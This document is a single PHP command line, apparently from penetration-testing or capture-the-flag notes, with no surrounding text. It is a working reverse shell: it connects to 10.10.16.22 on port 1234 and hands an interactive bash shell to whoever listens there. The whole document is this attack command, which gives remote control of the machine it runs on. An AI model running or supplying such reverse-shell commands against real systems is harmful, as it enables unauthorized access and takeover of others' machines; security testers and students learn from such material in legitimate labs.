php -r '$sock=fsockopen("10.10.16.22",1234);system("/bin/bash <&3 >&3 2>&3");'
